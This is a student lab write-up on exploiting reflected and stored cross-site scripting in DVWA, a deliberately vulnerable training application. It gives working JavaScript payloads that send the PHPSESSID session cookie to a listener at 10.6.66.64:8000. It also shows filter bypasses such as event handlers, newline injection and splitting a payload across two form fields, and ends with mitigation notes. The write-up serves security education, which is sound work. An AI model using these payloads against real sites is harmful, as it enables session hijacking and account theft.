# Tutorial 7: Client-Side Web Vulnerabilities (Part 1)

## Cross-site scripting vulnerabilities in DVWA
Our goal is to exploit the vulnerbilities in the **XSS (Reflected and Stored)** categories on `dvwa` to leak the user's session cookie. I will first go through the **Reflected** category, then the **Stored**. To test this vulneratility, a "fake" web server was instantiated on port 8000 using the following command:
```
ncat -lkc "perl -e 'while (defined(\$x = <>)){ print STDERR \$x; last if \$x eq qq#\\r\\n
# } print qq#HTTP/1.1 204 No Content\\r\\n#'" 8000
```
Our goal will be to then send the user's session cookie (`PHPSESSID`) to this server.

### XSS (Reflected)

#### *Security Level: low*

Looking at the source code, we can see that there is no filtering of the user input:
```php
echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
```
This means that a basic XXS attack should work. If we enter `<script src=http://10.6.66.42:8000></script>` instead of a name, we can see a response appear in the terminal of our "fake"  web server:
```
GET / HTTP/1.1
Host: 10.6.66.64:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.6.66.42/
```
Now that we've established communication to our web server, the next step is figuring out how to attach the session cookie to the http request. Unfortunately this isn't possible using our previous approach. In order to exfiltrate data, we need to make an `XMLHttpRequest`, which we can then add information to:
```html
<script>
  var msg = new XMLHttpRequest();
  var url = "http://10.6.66.64:8000";
  var params = "?test=test";
  msg.open("GET", url+params, async=false);
  msg.send();
</script>
```
Sending this script leads to the same response as the previous one, but with `GET /?test=test HTTP/1.1` as part of the first line. This now gives us the tool to exfiltrate data. Note that sending this request will cause the dvwa webpage to freeze up (presumably because we send an asynchronous request). Now that we can attach data, we need to get the session cookie. Cookies can be accessed in javascript with `document.cookie`. We could just send this entire string back as part of our query string, but finding the specific cookie we are looking for is a git more elegant. We can define the following javascript funciton to do this:
```javascript
function getCookie(name) {
  const value = `; ${document.cookie}`; // Pre-pends a ; to our string so that all cookies match the same pattern "; {name}={value}"
  const parts = value.split(`; ${name}=`); // Splits the string in 2 if we find our target cookie name, with the target value in the second part of the string
  if (parts.length === 2) return parts.pop().split(';').shift(); //Take the second element of the array (contains our target value), now split on ';' and take the first element (our target value)
}
```
Combining all of this together, we can send the following payload:
```html
<script>
    var msg = new XMLHttpRequest();
    var url = "http://10.6.66.64:8000";
    function getCookie(name) {
      const value = `; ${document.cookie}`;
      const parts = value.split(`; ${name}=`);
      if (parts.length === 2) return parts.pop().split(';').shift();
    }
    msg.open("GET", url+"?PHPSESSID="+getCookie("PHPSESSID"), async=false);
    msg.send();
</script>
```
We receive this in our web server as `GET /?PHPSESSID=c0qlht8eff4bsj7iqo3a0so092 HTTP/1.1`. If a user now visits the url which sets name to this payload, their session cookie would be leaked. If we check in the browser storage, we can see that the cookie we received matches the stored value of `PHPSESSID` (`c0qlht8eff4bsj7iqo3a0so092`).

#### *Security Level: medium*

To try and prevent XSS, the page is now filtering `<script>` tags out of the input:
```PHP
// Get input
$name = str_replace( '<script>', '', $_GET[ 'name' ] );

// Feedback for end user
echo "<pre>Hello ${name}</pre>";
```
However, this does not prevent us from executing javascript code. There are many ways this can be done:
- Using `<SCRIPT>, <Script>, <ScRiPt>, etc..` tags (i.e. make one of the letters non-lowercase)
- Using [**HTML Events**](https://www.w3schools.com/js/js_events.asp). Note that for this approach, the javascript code needs to be wrapped in `""`, meaning that you cannot use `"` in your javascript payload (use `'` or backticks instead for string literals). Some examples of this are:
  - The `onload` event attribute in `<body>, <iframe>, <style>`:
    ```html
    <body onload="alert(1);">
    ```

  - The `onerror` event attribute in `<img>, <object>`:
    ```html
    <object data="x" onerror="alert(1);">
    ```
  - The `onclick` event attribute on basically any HTML tag `<button>, <pre>, <em>, etc.`. Has a few exceptions, see [here](https://www.w3schools.com/tags/ev_onclick.asp):
    ```html
    <button onclick="alert(1);">Click me!</button>
    ```
    *This one is especially nice because the page loads a cute little button which you can then click to trigger the XSS :)*
  - The `onmouseover` event attribute (same as above)

***"There are more ways of executing javascript code in html than there are stars in our universe" - Carl Sagan***

For any of the methods above, we can simply insert the javascript payload we created for the *low* difficulty (ensuring `"` are removed if we use events). For example:
```html
<img src=x onerror="var msg = new XMLHttpRequest();
var url = 'http://10.6.66.64:8000';
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}
msg.open('GET', url+'?PHPSESSID='+getCookie('PHPSESSID'), async=false);
msg.send();">
```

#### *Security Level: high*

The page is now using a slightly beefier regex to prevent XSS:

```
// Get input
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

// Feedback for end user
echo "<pre>Hello ${name}</pre>";
```
Whilst this now prevents having `<script>` tags of different cases (the `/i` at the end of the regex means the regex is case-invariant), all the other methods of executing javascript code outlined in the *medium* section are still applicable. However, we also need to make sure that our payload avoids matching the regex above. Since our input is given as an only line, if the characters `s`, `c`, `r`, `i`, `p`, `t` appear in our code in, in that order (no matter how far apart they are), they will match the regex and be replaced. This is the case for our current payload (an easy way to check if a string matches a regex is using [RegExr](https://regexr.com/)). Our options are to either rewrite our payload to avoid this issue, or to do something a bit cheekier (and lower effort).

The `.` in the regex matches any character except line breaks, meaning that if we can put a line break in our payload, we should be safe from matching the regex (since we only use `<` to define the tag used). Whilst we can't insert line-breaks into the text box on the website, we can insert a line break in the url created by submitting our box using `%0A`, which is the URL encoded character for a new line. This should prevent the regex from matching our payload and allow it to be executed successfully.

For example, if we submit the payload:
```html
<button onclick="var msg = new XMLHttpRequest();
var url = 'http://10.6.66.64:8000';
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}
msg.open('GET', url+'?PHPSESSID='+getCookie('PHPSESSID'), async=false);
msg.send();">Click Me</button>
```
We can see the name parameter in the URL has been set to:
```
...?name=%3Cbutton+onclick%3D%22var+msg+%3D+new+XMLHttpRequest()%3B+var+url...
```
This is essentially our payload after URL encoding. The `%3B` is the URL encoding for `;`, so if we insert `%0A` for a line break, our javascript syntax should still be valid:
```
...?name=%3Cbutton+onclick%3D%22var+msg+%3D+new+XMLHttpRequest()%3B%0A+var+url...
                                                                   ^^^
```
If we now submit this URL, the page now renders a button, which when clicked executes our payload successfully!

### XSS (Stored)

#### *Security Level: low*

We are now uploading our payload to be stored in a database, which is then included in a HTML document. Looking at the source code, we can see that our input is sanitized to prevent SQL injection, but has no guards against an XSS:

```php
// Sanitize message input
$message = stripslashes( $message );
$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

// Sanitize name input
$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

// Update database
$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
```

This means we should be able to enter our payload from the previous section as either the name or message, and it should execute whenever the page is loaded, since all comments are displayed. One issue is that the text fields on the page only allow a fixed number of characters. One way around this is to send the post requests ourselves. We can encode our payload in url (using [this website](https://meyerweb.com/eric/tools/dencoder/)), and send the request.

Unfortunately, I ran into an issue. Even if we send the POST requests ourselves, there still seems to be some kind of maximum size we can send. After <del>so many hours :(</del> some testing, I finally determined the cause: the SQL database limits the sizes of the name and message. The name field is restricted to 100 characters and the message field is restricted to 300 characters. This means that any payloads  we send need to be <300 characters if we're injecting message, and <100 if we're injecting name. With this in mind, the following minified script works for (after being url encoded and sent in the message field):
```html
<script>var m=new XMLHttpRequest();var url="http://10.6.66.64:8000";function gC(name){var value=`; ${document.cookie}`;var p=value.split(`; ${name}=`);if (p.length===2){return p.pop().split(';').shift();}}m.open("GET",url+"?PHPSESSID="+gC("PHPSESSID"),async=false);m.send();</script>
```

#### *Security Level: medium*

On this level, messages are now sanitized as follows
```PHP
$message = strip_tags( addslashes( $message ) );
```
The `strip_tags` function basically prevents any HTML injections. Luckily, the name field is sanitized differently:
```PHP
$name = str_replace( '<script>', '', $name );
```
This is the same as the *medium* level for the previous vulnerability, so any similar payload can work. Note that now the `name` field is the vulnerable one, so this is the field where we need to insert our payload instead of message, which means we have only 100 characters to form a payload. Unfortunately, this means that even our simplest way to contact the server (120 chars) is too big. However, there is a way around this. If we look at the way guestbook logs are displayed on the webpage, they are placed in a div as follows:
```HTML
Name: test
<br>
Message: This is a test comment.
<br>
```
We can actually use both the `name` and `message` fields. Since name appears before message, we can start our payload in `name`, where there is weaker sanitization, and continue it in `message`. To do this we can add `/*` to the end of our `name` payload, and `*/` to the start of our `message` payload, as this will comment out anything in-between the 2. For example, given our previous payload of <300 chars, we can split it as follows:
```html
<body onload="var m=new XMLHttpRequest();/*

*/m.open('GET','http://10.6.66.64:8000?'+document.cookie,async=false);m.send();">
```
Unfortunately, this doesn't work due to the `"` being escaped by `addslashes`. There is another way of dealing with this character limit, although it also imposes limitations:
```
<img id='

' src=1 onerror=alert(1) //
```
This essentially captures what's between the `name` and `message` as part of a benign field of the html element, takes advantage of the weaker sanitization in the name field, and allows us to write a longer payload in the body:
```html
Name:
<img id="<br />Message: \" src="1" onerror="alert(1)" <br="">
```
However, we do have some limitations: we can't use single or double-quotes because of `addslashes`, but we can use backtick (\`), which work as template literals (formatted strings) in javascript. We also cannot write spaces in our code as we can't wrap the onerror code in quotes, so our javascript needs to be 1 uninterrupted block to be parsed together. This doesn't work with our current method of using `XMLHttpRequest`, but we can instead use the following to contact our server:
```javascript
fetch(`http://10.6.66.64:8000?${document.cookie}`);
```
This also greatly reduced the length of our code, so it is possible to send the entire payload in the `name` field.
```
<img id='

' src=1 onerror=fetch(`http://10.6.66.64:8000?PHPSESSID=${document.cookie.split(`; PHPSESSID=`).pop().split(`;`).shift()}`); //
```
This javascript payload works in on online emulated javascript environment, but doesn't work when it's used as a payload for dvwa. At this point, I can't be fucked to try and make it work and I've wasted enough time on this bullshit. The following payload in the `name` field works:
```html
<body onload=fetch(`http://10.6.66.64:8000?${document.cookie}`);>

```

#### *Security Level: high*

This level again reflects the previous category, with the same regex used to sanitize the name field.
```PHP
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
```
We can exploit this by using events to trigger javascript instead. An even larger list to the one I wrote previously can be found [**here**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). We can employ the same method used for the previous level to perform the XSS.

### Questions
1. In the **reflected** category, the following protections are in place:
  - *Medium level:* All occurences of the string `<script>` are stripped from the `name` URL query string parameter before it is inserted into the HTML.
  - *High level:* Any string matching the regex `/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i` are stripped from the `name` parameter.
  Neither are effective because there are ways of triggering script eexecution on a page that don't involve the use of `<script>` elements.

  In the **stored** category, the `message` parameter in the POST form data is insufficiently sanitised in the *low* security level, but correctly sanitised in the higher security level. The `name` parameter isn't correctly sanitised in any security level (with the same attempts as the previous category).

2. In both categories, in all security levels, the solution is the same: all user-supplied input, whether
read from the URL query string or the database, should be appropriately sanitised with PHP’s built in `htmlspecialchars()` function (ideally using ENT_QUOTES as the second parameter) before being inserted into the HTML. Otherwise `strip_tags( addslashes( $message ) ); ` seems to work very well.
